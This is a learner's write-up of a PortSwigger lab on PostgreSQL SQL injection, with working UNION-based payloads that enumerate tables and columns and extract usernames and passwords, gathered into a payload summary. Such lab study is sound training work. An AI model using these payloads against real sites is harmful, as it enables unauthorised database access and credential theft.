# 🛡️ Lab: SQL Injection – Listing Database Contents (PostgreSQL)

## 📌 Platform

* PortSwigger Web Security Academy

---

## 🎯 Objective

Retrieve the contents of the users table by:

* Enumerating tables
* Finding column names
* Extracting usernames and passwords
* Logging in as administrator

---

# 🔍 Step 1: Identify SQL Injection

### 🧪 Payload

```sql
'
```

### 🔍 Observation:

* Internal Server Error

### 📌 Conclusion:

* Query breaks → SQL Injection is possible

---

# 🚫 Step 2: Initial Attempt (Login Bypass)

Tried:

```text
administrator--+
```

### ❌ Result:

* Login did not work

### 📌 Conclusion:

* Direct login bypass is not possible in this lab
* Need to extract data instead

---

# 🔍 Step 3: Test SQLi in URL

Tested injection in:

```url
/category?category=Gifts
```

Confirmed:

* SQLi works in URL parameter

---

# 🧠 Step 4: Identify Database Type

Used version query and observed output:

* Identified database as **PostgreSQL**

---

# ⚠️ Step 5: Major Issue (Query Breaking)

Tried:

* `UNION SELECT`
* `OR 1=1`
* `ORDER BY`

### ❌ Result:

* only order by worked other gave error of internal server error

---

## 🧠 Root Cause

* Query was not properly terminated
* Remaining part of original query was still executing

---

# 🔐 Step 6: Fix Using Comments

Learned:

```sql
--
```

is used to comment remaining query

---

## ⚠️ Important Detail

In URL-based SQLi:

```text
--      ❌ may fail
--+     ✅ works (adds space)
--%20   ✅ works (encoded space)
```

👉 SQL requires space after `--`

---

## 🧪 Working Payload

```sql
'--+
```

### ✅ Result:

* Page loads normally

---

# 📊 Step 7: Find Number of Columns

### 🧪 Method 1: ORDER BY

Tried:

```sql
' ORDER BY 1--+
' ORDER BY 2--+
```

### ✅ Result:

* Both worked without error

Tried:

```sql
' ORDER BY 3--+
```

### ❌ Result:

* Error

### 📌 Conclusion:

* Query has **2 columns**

---

### 🧪 Method 2: UNION

```sql
' UNION SELECT NULL,NULL--+
```

### ✅ Result:

* No error

### 📌 Conclusion:

* Confirmed again → **2 columns**

---

# 🔍 Step 8: Extract Table Names

Used:

```sql
' UNION SELECT NULL, table_name FROM information_schema.tables--+
```

### ✅ Result:

* Large list of tables displayed

---

# 🧠 Step 9: Identify Useful Table

Filtered out:

* `pg_*` → system tables
* `sql_*` → system tables

Focused on:

```text
users_ucjqcd
products
```

### 📌 Conclusion:

* Target table = **users_ucjqcd**

---

# 🔍 Step 10: Extract Column Names

Initial mistake:

```sql
FROM information_schema.tables ❌
```

### ❌ Issue:

* `tables` does not contain column names

---

## ✅ Fixed Query

```sql
' UNION SELECT NULL, column_name 
FROM information_schema.columns 
WHERE table_name='users_ucjqcd'--+
```

### ✅ Result:

* Retrieved column names

---

# 💥 Step 11: Extract User Data

Used:

```sql
' UNION SELECT username_xxx, password_xxx FROM users_ucjqcd--+
```

### ✅ Result:

* Retrieved usernames and passwords

---

# 🔓 Step 12: Login as Administrator

* Used extracted credentials
* Logged in successfully

✅ Lab solved

---

# ⚠️ Additional Observation (Important)

Tried random payload:

```sql
UNION SELECT * FROM TABLE
```

### ⚠️ Result:

* Lab marked as solved
* Redirected to admin page

---

## 🧠 Explanation

* This was an **accidental authentication bypass**
* Not a proper or reliable SQLi method
* Did not actually extract data

---

# 🧠 Key Learnings

* Always terminate queries properly (`--+`, `--%20`)
* UNION requires correct:

  * column count
  * data type
* ORDER BY can also be used to find column count
* Never use `SELECT *` in SQLi
* Use:

  * `information_schema.tables` → table names
  * `information_schema.columns` → column names
* Avoid guessing → always enumerate
* Multiple exploitation paths exist:

  * data extraction (correct method)
  * logic bypass (accidental / unreliable)

---

# 🛠️ Payload Summary

### Injection Test

```sql
'
```

### Fix Query

```sql
'--+
```

### Find Columns (ORDER BY)

```sql
' ORDER BY 1--+
' ORDER BY 2--+
```

### Find Columns (UNION)

```sql
' UNION SELECT NULL,NULL--+
```

### Get Tables

```sql
' UNION SELECT NULL, table_name FROM information_schema.tables--+
```

### Get Columns

```sql
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_ucjqcd'--+
```

### Extract Data

```sql
' UNION SELECT username_xxx, password_xxx FROM users_ucjqcd--+
```

---

# 📌 Conclusion

This lab demonstrates full SQL injection exploitation workflow:

1. Detect injection
2. Fix query using comments
3. Identify column count (ORDER BY + UNION)
4. Enumerate tables
5. Enumerate columns
6. Extract sensitive data

---

